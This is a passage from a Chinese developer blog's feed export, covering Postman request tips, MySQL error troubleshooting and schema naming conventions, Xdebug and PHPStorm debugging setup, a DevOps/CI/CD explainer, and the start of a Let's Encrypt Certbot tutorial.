class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br></pre></td></tr></table></figure><p>body 的数据格式选择 <code>x-www-form-urlencode</code>，如果选择<code>form-data</code>则接收到的数据格式会是这个样子：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919202055.png" alt=""></p><p>如果以<code>x-www-form-urlencode</code>格式进行提交，那么接收到的数据是这个样子，可以直接通过魔术变量获取使用。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919202746.png" alt=""></p><h3 id="如何把请求参数作为json-格式进行提交？"><a href="#如何把请求参数作为json-格式进行提交？" class="headerlink" title="如何把请求参数作为json 格式进行提交？"></a>如何把请求参数作为json 格式进行提交？</h3><p>在<code>Body</code>中，选择<code>raw</code> 然后把请求参数以json 的格式填进去。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200919203537.png" alt=""></p><p>不过需要注意，以json 格式提交的请求，用常见的魔术变量获取不到，需要使用以下方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;));</span><br></pre></td></tr></table></figure><h2 id="提交文件"><a href="#提交文件" class="headerlink" title="提交文件"></a>提交文件</h2><p>有时候我们希望可以测试文件提交，使用 Postman 当然也可以完成。</p><p>请求方式选择POST，Headers 可以不用做选择，Body 选择 <code>form-data</code>，类型由默认的text 改成 file，然后选择需要提交的文件即可。</p><p>注意：key 最好也填上 file 这个关键字。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20201030081600.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.postman.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Postman&lt;/a&gt; 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Postman" scheme="https://www.0x2beace.com/tags/Postman/"/>
    
    <category term="JSON" scheme="https://www.0x2beace.com/tags/JSON/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 常见异常分析</title>
    <link href="https://www.0x2beace.com/mysql-common-exception-analysis/"/>
    <id>https://www.0x2beace.com/mysql-common-exception-analysis/</id>
    <published>2020-09-17T12:52:29.000Z</published>
    <updated>2020-09-17T12:57:42.663Z</updated>
    
    <content type="html"><![CDATA[<p>本文用来整理 Mysql 使用过程中遇到的一些问题。</p><a id="more"></a><h2 id="Mysql-无法正常启动"><a href="#Mysql-无法正常启动" class="headerlink" title="Mysql 无法正常启动"></a>Mysql 无法正常启动</h2><p>异常描述：Mysql Server 无法正常启动，Client 连接Mysql 异常如下：</p><blockquote><p>ERROR 2002 (HY000): Can’t connect to local MySQL server through socket ‘/var/run/mysqld/mysqld.sock’ (2)</p></blockquote><p>首先，这个错误意味着 <code>/var/run/mysqld/mysqld.sock</code> 不存在，而该文件之所以不存在，可能是因为没有安装 <code>mysql-server</code>，也可能是因为该文件被移动了。</p><p>如果是需要连接本机的Mysql（mysql -hlocalhost -uroot -p），那么需要先安装 <code>mysql server</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server -y</span><br></pre></td></tr></table></figure><p>如果Mysql 服务确实有在本地运行，那么请检查<code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> 配置文件，是否存在以下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket &#x3D; &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock</span><br></pre></td></tr></table></figure><p>如果只是需要连接其他主机，那么在本机上不安装 <code>Mysql Server</code> 也可以，但需要保证“其他主机”的Mysql 已经正常启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h&lt;hostname&gt; -uroot -p</span><br></pre></td></tr></table></figure><p>总结：<br>最有可能的情况是需要连接的Mysql 服务根本没有启动，要么没有在与从终端运行MySQL客户端的主机相同的主机上运行，小概率是因为配置文件错误导致。</p><h2 id="Mysql-用户验证失败"><a href="#Mysql-用户验证失败" class="headerlink" title="Mysql 用户验证失败"></a>Mysql 用户验证失败</h2><p>异常描述：Mysql 创建完该用户之后，赋予权限并设置密码，但是总是会提示如下异常：</p><blockquote><p>ERROR 1045 (28000): Access denied for user ‘zabbix’@’172.17.0.1’ (using password: YES)</p></blockquote><p>出现该异常信息可能有以下几种情况：</p><ol><li>用户名密码错误</li><li>该用户权限不足</li></ol><h2 id="Mysql-断开连接"><a href="#Mysql-断开连接" class="headerlink" title="Mysql 断开连接"></a>Mysql 断开连接</h2><p>异常描述：Mysql 偶尔会自己断开连接，然后必须重启Mysql 服务才能正常运行。</p><blockquote><p>ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading initial communication packet’, system error: 102</p></blockquote><p>目前并没有找到合适的解决方案，不过能大致确定以下几个方向：</p><ol><li>反向DNS 解析，避免使用<code>localhost</code></li><li>允许使用所有连接？</li></ol><p>localhost 对应socket？127.0.0.1 对应 TCP/IP？</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://cloud.tencent.com/developer/ask/35881" target="_blank" rel="noopener">错误2002(HY000)：无法通过Socket‘/var/run/mysqld/mysqld.sock’连接到本地MySQL服务器(2)</a></li><li><a href="https://stackoverflow.com/questions/21091850/error-2013-hy000-lost-connection-to-mysql-server-at-reading-authorization-pa" target="_blank" rel="noopener">ERROR 2013 (HY000): Lost connection to MySQL server at ‘reading authorization packet’, system error: 0</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文用来整理 Mysql 使用过程中遇到的一些问题。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 数据库设计规范与原则</title>
    <link href="https://www.0x2beace.com/mysql-database-design-rules-and-principles/"/>
    <id>https://www.0x2beace.com/mysql-database-design-rules-and-principles/</id>
    <published>2020-09-16T12:48:21.000Z</published>
    <updated>2020-09-16T12:51:01.020Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。</p><a id="more"></a><h3 id="1、数据库命名规范"><a href="#1、数据库命名规范" class="headerlink" title="1、数据库命名规范"></a>1、数据库命名规范</h3><ul><li>命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 <code>_</code> 进行分割。</li><li>一般来说，数据表命名用单数，字段命名也用单数</li><li>数据库里面的密码一定要加密，不能保存明文</li><li>Mysql 引擎类型统一使用 InnoDB，字符编码统一使用 UTF-8</li></ul><h3 id="2、数据库表名命名规范"><a href="#2、数据库表名命名规范" class="headerlink" title="2、数据库表名命名规范"></a>2、数据库表名命名规范</h3><ul><li>命名简洁明确，可以采用字母 + 数字进行组合，多个单词可以使用下划线 <code>_</code> 进行分割。</li><li>可以合理增加表前缀，有效区分不同类型的数据表</li></ul><h3 id="3、数据库表字段名命名规范"><a href="#3、数据库表字段名命名规范" class="headerlink" title="3、数据库表字段名命名规范"></a>3、数据库表字段名命名规范</h3><ul><li>命名简洁明确，多个单词使用下划线<code>_</code>进行分割（统一使用小写）</li><li>避免使用自定义缩写，如：<code>date =&gt; dt</code></li><li>表与表之间的相关联字段名称要求尽可能的相同</li><li>每个字段尽量备注其含义</li></ul><h3 id="4、数据库表字段类型规范"><a href="#4、数据库表字段类型规范" class="headerlink" title="4、数据库表字段类型规范"></a>4、数据库表字段类型规范</h3><ul><li>最好给每个字段一个默认值，<strong>避免使用 NULL</strong>。字符型默认值为一个空字符值串，数值型的默认值为数值0，逻辑型的默认值为数值0</li><li>用尽量少的存储空间来存储一个字段的数据</li><li>能用 <code>tinyint</code> 就不用 <code>int</code>，能用 <code>int</code> 就不要用 <code>varchar</code>，能用 <code>varchar(16)</code>就不要用 <code>varchar(225)</code></li><li>boolean 类型的命名统一使用<code>is_xxx</code>格式</li></ul><h3 id="5、数据库表索引规范"><a href="#5、数据库表索引规范" class="headerlink" title="5、数据库表索引规范"></a>5、数据库表索引规范</h3><ul><li>为每个表创建一个主键索引;</li><li>为每个表创建合理的普通索引;</li></ul><h3 id="一些注意事项"><a href="#一些注意事项" class="headerlink" title="一些注意事项"></a>一些注意事项</h3><ul><li>避免使用NULL字段(NULL字段很难查询优化、NULL字段的索引需要额外空间、NULL字段的复合索引无效)</li><li>避免使用 <code>count(*)</code></li><li>避免使用 <code>select *</code></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/tinywan/p/6547500.html" target="_blank" rel="noopener">MYSQL数据库设计规范与原则</a></li><li><a href="https://changsiyuan.github.io/2016/05/06/2016-5-6-database-design/" target="_blank" rel="noopener">数据库设计原则</a></li><li><a href="https://cloud.tencent.com/developer/article/1054482" target="_blank" rel="noopener">数据库表名字段命名规范</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近需要根据业务需求重新设计一套完整的数据库，记录一下规范的数据库设计原则。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Windows、Mac 下使用 PHPStorm 配置 Xdebug，实现断点调试</title>
    <link href="https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/"/>
    <id>https://www.0x2beace.com/use-phpstorm-to-configure-xdebug-under-windows-and-mac/</id>
    <published>2020-09-15T13:15:36.000Z</published>
    <updated>2020-09-15T13:21:21.882Z</updated>
    
    <content type="html"><![CDATA[<p>搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。<br>所以便有了这篇关于<code>PHPSTORM</code>调试的笔记。</p><a id="more"></a><p>在进行调试之前，首先要做的是下载并安装<code>Xdebug</code>，然后才能做相应的配置。</p><h2 id="下载Xdebug（Windows）"><a href="#下载Xdebug（Windows）" class="headerlink" title="下载Xdebug（Windows）"></a>下载Xdebug（Windows）</h2><ul><li><a href="https://xdebug.org/download.php" target="_blank" rel="noopener">xdebug官网</a></li></ul><blockquote><p>如何选择符合自己PHP的版本的Xdebug，可以通过下面这种方法来判断。</p></blockquote><p>使用Xdubug官方提供的一个<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">检测工具</a></p><p>在命令行中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Mac</span><br><span class="line">$ php -i | pbcopy</span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">$ php -i | xsel </span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">$ php -i | clip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211657.png" alt=""></p><p>将输出的<code>phpinfo</code>信息填入，然后就会自动检测该版本的PHP 所对应的Xdebug，如下图（这里以Windows 为例）：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200915211717.png" alt=""></p><p>点击下载相应的文件。</p><h2 id="安装并配置Xdebug"><a href="#安装并配置Xdebug" class="headerlink" title="安装并配置Xdebug"></a>安装并配置Xdebug</h2><ol><li>将下载好的文件放进指定目录 <code>..\php\ext\</code></li><li>配置<code>php.ini</code>文件，这里需要注意的是：要找到正确的<code>php.ini</code>文件。如果你不确定是哪一个，可以参考下面这个方法：</li></ol><p>打印出<code>phpinfo()</code>，找到字段<code>Loaded Configuration File</code>根据后面的路径去找就没错了。</p><p>打开找到的php.ini配置文件，在最后面加上以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line">[XDebug]</span><br><span class="line">zend_extension &#x3D; &quot;C:\xampp\php\ext\php_xdebug-2.6.1-7.2-vc15.dll&quot;  #这个地址指向 xdebug所在的文件路径</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTROM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>其中：</p><ol><li><code>xdebug.remote.host</code>如果是本地调试，填<code>localhost</code>就好。</li><li><code>xdebug.remote_port</code>为调试所监听的端口，通常默认使用 <code>9001</code> ，需要和PHPStorm 中的 Debug port 相同。</li></ol><h2 id="下载并安装Xdebug（Mac）"><a href="#下载并安装Xdebug（Mac）" class="headerlink" title="下载并安装Xdebug（Mac）"></a>下载并安装Xdebug（Mac）</h2><p>Mac 下安装Xdebug，有两种方式：</p><ol><li>使用<code>pecl</code>命令</li><li>通过源码编译</li></ol><h3 id="使用-pecl"><a href="#使用-pecl" class="headerlink" title="使用 pecl"></a>使用 pecl</h3><blockquote><p>Pecl 是 PHP 的包管理器。</p></blockquote><p>这里以<code>PHP5.6</code>为例，需要安装最新<code>2.5.x</code>版本的Xdebug，因为这是<code>PHP5.6</code>提供支持的最后一个版本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h3 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h3><p>源码获取的方式和上面Windows 的方式是一样的，将输出的<code>phpinfo</code>粘贴至输入框，然后下载对应版本的Xdebug。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tar -xvzf xdebug-2.9.4.tgz</span><br><span class="line">$ cd xdebug-2.9.4.tgz</span><br><span class="line">$ phpize</span><br><span class="line">$ .&#x2F;configure</span><br><span class="line">$ make</span><br><span class="line">$ cp modules&#x2F;xdebug.so &#x2F;usr&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug</span><br></pre></td></tr></table></figure><h4 id="启用Xdebug"><a href="#启用Xdebug" class="headerlink" title="启用Xdebug"></a>启用Xdebug</h4><p>无论是通过哪种方式安装，在正式使用之前，都需要手动启用该模块。</p><p>找到对应版本的 php.ini 文件并编辑，在配置文件中的最后部分加上以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;extensions&#x2F;xdebug&#x2F;xdebug.so&quot;</span><br><span class="line">xdebug.profiler_enable &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port&#x3D;9001</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br><span class="line">xdebug.remote_host &#x3D; localhost</span><br></pre></td></tr></table></figure><p>重启PHP即可。</p><blockquote><p>如何检查Xdebug 是否启用？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php -m | grep xdebug</span><br><span class="line">xdebug</span><br></pre></td></tr></table></figure><h3 id="在PHPStorm中配置Xdebug"><a href="#在PHPStorm中配置Xdebug" class="headerlink" title="在PHPStorm中配置Xdebug"></a>在PHPStorm中配置Xdebug</h3><h4 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h4><ol><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code>，确保<code>PHPStorm</code> 已经找到了<code>Xdebug</code>。</li></ol><p>在刚才的配置没错的前提下，这里是可以看到已经成功安装了<code>Xdebug</code>的。</p><p><img src="https://i.loli.net/2020/03/24/yw6EbgcujoFILXU.png" alt="image.png"></p><p>如果显示没有安装，请检查上面两步操作有无问题。</p><ol start="2"><li><code>File-&gt;Setting-&gt;PHP-&gt;Debug</code></li></ol><p><img src="https://i.loli.net/2020/03/24/iKkmq3AsIy2UOWX.jpg" alt="PHPStorm 2.jpg"></p><p>Debug port 与<code>php.ini</code>配置文件中的<code>xdebug.remote_port</code>的对应参数保持一致。</p><ol start="3"><li><code>File-&gt;Setting-&gt;PHP-&gt;Server</code>，这三个参数的值和<code>php.ini</code>中的保持一致。</li></ol><p><img src="https://i.loli.net/2020/03/24/sgzX4G957CuTWPj.jpg" alt="PHPStorm 3.jpg"></p><ol start="4"><li>配置域名</li></ol><p><img src="https://i.loli.net/2020/03/24/kecrgBb1IfWaVYR.jpg" alt="PHPStorm 4.jpg"></p><p>这里根据实际情况配置，我本地使用80 端口作为项目访问端口，所以这里填的是80。</p><ol start="5"><li>配置调试参数</li></ol><p><img src="https://i.loli.net/2020/03/24/pShQCstHl7N32na.jpg" alt="PHPStorm 5.jpg"></p><ol start="6"><li><code>Run-&gt;Web Server Debug Validation</code>，检查是否配置成功。</li></ol><p><img src="https://i.loli.net/2020/03/24/Plxvs6gKOcqIGV1.jpg" alt="PHPStorm 6.jpg"></p><p>确保项目文件路径和本地域名能正常访问，如果一切正常则能看到输出。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>Windows 下的PHPStorm 配置和Mac 几乎差不多，保证一下几点是正常的基本上没啥问题。</p><ol><li>确保PHPStorm 启用了对应版本的 Xdebug。</li><li>PHPStorm 的调试信息与<code>php.ini</code>文件中保持一致。</li><li>项目文件路径和本地域名能正常访问。</li></ol><blockquote><p>Xdebug 调试端口并非一定要用9001，只要保持<code>php.ini</code>与<code>PHPStorm</code> 的保持一致就好了。</p></blockquote><h4 id="在PHPStorm中使用Xdebug"><a href="#在PHPStorm中使用Xdebug" class="headerlink" title="在PHPStorm中使用Xdebug"></a>在PHPStorm中使用Xdebug</h4><p>有两种方式使用Xdebug：</p><ol><li>直接在编辑器中开始调试。</li><li>通过在请求地址中附加xdebug 的请求参数来调试，这招通常用来处理一些前后端分离的联动调试。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://laravel-china.org/articles/16770/the-first-chapter-of-laravel-phpstrom-xdebug-configuration-and-use" target="_blank" rel="noopener">PhpStrom Xdebug 配置与使用</a></li><li><a href="https://getgrav.org/blog/macos-mojave-apache-mysql-vhost-apc" target="_blank" rel="noopener">如何在Mac 上为不同版本的PHP 开启Xdebug</a></li><li><a href="https://www.jetbrains.com/help/phpstorm/configuring-xdebug.html" target="_blank" rel="noopener">配置Xdebug-官方教程</a></li><li><a href="https://xdebug.org/" target="_blank" rel="noopener">Xdebug 官网</a></li><li><a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">Xdebug 检测工具</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;搭建过很多次开发环境了，但每次在调试这一块还是会多少耗费一点时间。&lt;br&gt;所以便有了这篇关于&lt;code&gt;PHPSTORM&lt;/code&gt;调试的笔记。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Xdebug" scheme="https://www.0x2beace.com/tags/Xdebug/"/>
    
  </entry>
  
  <entry>
    <title>什么是DevOps、CI、CD、K8S</title>
    <link href="https://www.0x2beace.com/what-is-devops-ci-cd-k8s/"/>
    <id>https://www.0x2beace.com/what-is-devops-ci-cd-k8s/</id>
    <published>2020-09-12T14:40:00.000Z</published>
    <updated>2020-09-14T01:44:10.169Z</updated>
    
    <content type="html"><![CDATA[<p>之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。</p><p>gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094145.png" alt=""></p><p>只是了解到一个叫做 <code>CI/CD</code>的东西。后来又延伸扩展到<code>DevOps</code>、<code>K8S</code> 这些新概念。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094211.png" alt=""></p><h2 id="什么是-DevOps？"><a href="#什么是-DevOps？" class="headerlink" title="什么是 DevOps？"></a>什么是 DevOps？</h2><p>如题，什么是 DevOps ？根据字面意思理解就是：<code>Dev</code> + <code>Ops</code>，开发（Development）和运营（Operations）这两个领域的合并。</p><p>就我个人的理解，它是一个概念、一种思维，是一种通力合作，共同解决问题的方式。</p><p>这里我就不追根溯源去解释为什么要合并开发和运营了，因为历史原因，总是存在着这样的问题。具体看参考链接一。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200914094228.png" alt=""></p><p>DevOps 也不仅仅是一种软件的部署方法。它通过一种全新的方式，来思考如何让软件的作者（开发部门）和运营者（运营部门）进行合作与协同。使用了DevOps模型之后，会使两个部门更好的交互。<br>其中，<code>自动化部署</code>的概念就是从中产生的。</p><h2 id="什么是-CI-CD？"><a href="#什么是-CI-CD？" class="headerlink" title="什么是 CI/CD？"></a>什么是 CI/CD？</h2><p>Gitlab 的<code>CI/CD</code>到底是什么呢？</p><p>昨天大致了解了下 <code>Gitlab CI/CD</code>，不是很明白，但觉得很厉害。<br>首先来看下官方文档的简介：</p><blockquote><p>软件开发的连续方法基于自动执行脚本，以最大限度地减少在开发应用程序时引入错误的可能性。从新代码的开发到部署，它们需要较少的人为干预甚至根本不需要干预。<br>它涉及在每次小迭代中不断构建，测试和部署代码更改，从而减少基于有缺陷或失败的先前版本开发新代码的机会。</p></blockquote><p>这里有三种主要的方法，根据最适合你的策略进行选择。</p><h3 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h3><p>考虑一个应用程序，其代码存储在Gitlab中的存储库中。开发人员每天多次推送代码更改，对于每次推动到存储库，都可以创建一组脚本来自动构建和测试应用程序，从而减少向应用程序引入错误的可能性。这种方法被称为：<strong>持续集成（Continuous Integration）</strong></p><h3 id="持续交付"><a href="#持续交付" class="headerlink" title="持续交付"></a>持续交付</h3><p><strong>持续交付 Continuous Delivery</strong>是持续集成的一个步骤，应用程序不仅在推送到代码库的每个代码更改时都构建和测试，而且作为一个额外的步骤，它也会连续部署，尽管部署是手动触发的。</p><h3 id="持续部署"><a href="#持续部署" class="headerlink" title="持续部署"></a>持续部署</h3><p><strong>持续部署 Continuous Deployment</strong>也是持续集成的又一步，类似于持续交付。不同之处在于，不必手动部署应用程序，而是将其设置为自动部署。完全不需要人工干预就可以部署应用程序。</p><h2 id="什么是-K8S？"><a href="#什么是-K8S？" class="headerlink" title="什么是 K8S？"></a>什么是 K8S？</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/bjweimengshu/article/details/79031552" target="_blank" rel="noopener">什么是DevOps？–程序员小灰</a></li><li><a href="https://www.cnblogs.com/servicehot/p/6510199.html" target="_blank" rel="noopener">DevOps 到底是什么？</a></li><li><a href="https://docs.gitlab.com/ee/ci/introduction/index.html" target="_blank" rel="noopener">使用GitLab介绍CI / CD</a></li><li><a href="http://www.ttlsa.com/auto/gitlab-cicd-quick-start/" target="_blank" rel="noopener">Gitlab CI/CD 快速入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/quick_start/README.html" target="_blank" rel="noopener">Gitlab CI/CD 入门</a></li><li><a href="https://docs.gitlab.com/ee/ci/README.html" target="_blank" rel="noopener">Gitlab CI 示例</a></li><li><a href="https://docs.gitlab.com/ee/ci/docker/README.html" target="_blank" rel="noopener">Docker 集成</a></li><li><a href="https://docs.gitlab.com/runner/" target="_blank" rel="noopener">Git Runner 是什么？</a></li><li><a href="https://docs.gitlab.com/runner/install/" target="_blank" rel="noopener">安装Gitlab Runner</a></li><li><a href="https://docs.gitlab.com/ee/topics/autodevops/index.html" target="_blank" rel="noopener">什么是 Auto DevOps</a></li><li><a href="https://zhuanlan.zhihu.com/p/29232090" target="_blank" rel="noopener">K8S 是什么？知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/33640916" target="_blank" rel="noopener">为什么 K8S 很酷</a></li><li><a href="https://github.com/rootsongjc/kubernetes-handbook" target="_blank" rel="noopener">K8S 中文指南</a></li><li><a href="https://zhuanlan.zhihu.com/p/28810342" target="_blank" rel="noopener">一文了解 K8S 是什么？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之所以要写这片笔记，是因为前段时间在使用 gitlab 提交代码时，遇到了点问题。&lt;/p&gt;
&lt;p&gt;gitlab 提示我 commit 失败。跟进了一下，并没有找到答案。&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="https://www.0x2beace.com/categories/Docker/"/>
    
    
    <category term="DevOps" scheme="https://www.0x2beace.com/tags/DevOps/"/>
    
    <category term="K8S" scheme="https://www.0x2beace.com/tags/K8S/"/>
    
  </entry>
  
  <entry>
    <title>如何自动申请免费的SSL 证书</title>
    <link href="https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/"/>
    <id>https://www.0x2beace.com/how-to-automatically-apply-for-a-free-ssl-certificate/</id>
    <published>2020-09-11T08:18:20.000Z</published>
    <updated>2020-12-21T13:39:01.225Z</updated>
    
    <content type="html"><![CDATA[<p>上次介绍了如何通过第三方网站申请免费的SSL 证书，但有效期只有三个月，三个月之后又需要再次申请，记得还好，如果忘了可能还会造成不必要的损失。</p><a id="more"></a><p><a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s Encrypt</a> 是一个免费提供的SSL 证书的CA，虽然每次签发的有效期都只有三个月，但是发证是自动化的，发证速度较快，并且可以通过脚本来自动续签，为个人网站使用HTTPS提供了一个不错的选择。</p><p>Let’s Encrypt （以下简称LE）的证书签发主要使用基于 ACME协议 的证书自动管理客户端来实现。</p><p>LE官方推荐的客户端是 <a href="https://certbot.eff.org/" target="_blank" rel="noopener">Certbot</a> ，本文中就是使用 Certbot 来获取和续签证书。</p><h2 id="LE-是如何自动签发证书的"><a href="#LE-是如何自动签发证书的" class="headerlink" title="LE 是如何自动签发证书的"></a>LE 是如何自动签发证书的</h2><p>假设现在要申请CA 证书的域名是 <code>example.com</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120519.png" alt=""></p><p>首先由WebServer（也就是我们用户端的服务器）的管理客户端（如Certbot）发送请求到LE，让LE来验证客户端是否真的控制example.com这个域名，接下来LE会提出一些验证动作（原文challenges），比如让客户端在一个很明显的路径上放指定的文件。同时，LE还会发出一个随机数，客户端需要用这个随机数和客户端自己的私钥来进行签名。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120904.png" alt=""></p><p>WebServer上的客户端完成LE指定的域名验证动作并且将加密后的签名后，再次发送请求到LE要求验证，LE会验证发回来的签名是否正确，并且验证域名验证动作是否完成，如下载指定的文件并且判断文件里面的内容是否符合要求。</p><p>这些验证都完成以后，可以申请证书了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200911120943.png" alt=""></p><p>完成验证后，客户端生成自己的私钥以及 <a href="https://tools.ietf.org/html/rfc2986" target="_blank" rel="noopener">Certificate Signing Request（CSR）</a> 发送到LE服务器，LE服务器会将CA证书（也是公钥）发放到你的服务器。</p><p>这样就完成了CA证书的自动化发放了。</p><h3 id="使用Certbot-获取证书"><a href="#使用Certbot-获取证书" class="headerlink" title="使用Certbot 获取证书"></a>使用Certbot 获取证书</h3><p>LE 的CA 证书发放原理看着还挺麻烦的，但如果使用 Certbot 客户端，整个过程还是挺简单的。</p><p>在正式获取证书之前，推荐先去<a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">Certbot 官网</a>选择适合自己的系统环境。</p><p>我这边系统环境是<code>Nginx</code> + <code>Ubuntu 18.04 LTS</code>，所以下面介绍的安装流程只适用于<strong>Ubuntu + Nginx</strong>。</p><h4 id="1-安装-snap"><a href="#1-安装-snap" class="headerlink" title="1. 安装 snap"></a>1. 安装 snap</h4><p><a href="https://zh.wikipedia.org/zh-hans/Snappy_(%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8)" target="_blank" rel="noopener">snap</a> 是Canonical公司发布的全新的软件包管理方式，它类似一个容器拥有一个应用程序所有的文件和库，各个应用程序之间完全独立。使用snap 